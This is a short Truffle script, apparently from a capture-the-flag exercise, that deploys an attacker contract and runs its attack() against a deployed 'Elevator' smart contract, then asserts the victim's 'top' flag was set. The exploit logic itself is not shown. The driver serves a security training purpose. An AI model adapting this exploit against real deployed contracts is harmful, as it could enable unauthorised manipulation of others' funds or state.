const ElevatorContract = artifacts.require('Elevator')
const ElevatorAttackContract = artifacts.require('ElevatorAttack')
const assert = require('assert')

async function execute(callback) {
    // Instance victim and attacker contract
    let victimContract = await ElevatorContract.deployed()
    let attackerAccount = web3.eth.accounts[1]
    let attackerContract = await ElevatorAttackContract.new({
        from: attackerAccount
    })

    // Execute exploit
    await attackerContract.attack(victimContract.address, {
        from: attackerAccount
    })
    
    // Check if top was reached
    let top = await victimContract.top.call({
        from: attackerAccount
    })
    assert.equal(top, true)
    console.log('At the top floor!')

    callback()
}

module.exports = execute